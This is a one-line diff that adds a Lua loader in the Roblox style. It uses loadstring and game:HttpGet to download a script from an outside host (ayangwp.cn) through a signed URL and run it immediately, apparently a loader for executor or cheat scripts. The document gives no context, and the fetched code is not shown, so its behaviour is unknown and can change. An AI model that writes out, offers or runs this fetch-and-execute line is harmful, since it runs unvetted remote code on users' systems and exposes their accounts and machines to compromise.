@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8721/77.lua?sign=8w0zYhL1fmVBv98uTo8SRR_SQXVCIqEKPNMl1NFrrxY%3D%3A0"))()
